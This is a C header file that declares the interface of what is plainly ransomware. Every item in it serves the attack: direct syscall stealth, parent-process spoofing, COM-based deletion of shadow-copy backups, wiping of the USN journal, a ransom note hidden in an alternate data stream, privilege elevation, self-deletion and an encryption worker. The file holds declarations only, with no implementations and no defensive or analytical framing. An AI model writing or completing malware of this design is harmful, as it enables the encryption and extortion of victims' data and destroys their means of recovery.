/* utils.h - Advanced stealth interface */
#ifndef UTILS_H
#define UTILS_H

#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ─── Stealth init ─── */
void InitAllSyscalls(void);

/* ─── PPID Spoofing ─── */
DWORD FindProcessPidStr(const char* procName);
HANDLE CreateProcessSpoofed(LPCSTR cmdLine, DWORD parentPid);

/* ─── COM-based VSS deletion ─── */
void NukeBackupsCOM(void);

/* ─── USN Journal wipe ─── */
void WipeUSNJournal(void);

/* ─── ADS ransom note ─── */
void DropNoteADS(void);

/* ─── IO priority ─── */
void SetIoCrtitical(void);

/* ─── Self-delete with spoofed parent ─── */
void SelfDeleteSpoofed(void);

/* Original functions kept for compatibility */
void ElevatePrivileges(void);
void NukeBackups(void);
void DropNote(void);
void SelfDelete(void);
unsigned __stdcall EncryptionWorker(void* arg);

#ifdef __cplusplus
}
#endif

#endif /* UTILS_H */
